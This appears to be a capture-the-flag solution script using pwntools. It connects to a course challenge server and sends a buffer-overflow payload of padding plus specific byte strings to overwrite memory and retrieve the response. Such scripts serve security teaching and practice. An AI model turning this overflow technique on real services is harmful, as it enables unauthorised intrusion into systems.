from pwn import *

p = remote("cs2107-challs.nusgreyhats.org", 8051)

payload = b'A' * 0x20 + b"i165DnHauCmLqRHN" + b"cZiwk5rfGFgPZYP4" + b"O6FtZhpU6C6BXx16" + b"AAAAAAAAAAAAAAAA"

p.recvline()
p.recvline()
p.sendline(payload)
response = p.recvall().decode()
print(response)
p.close()
 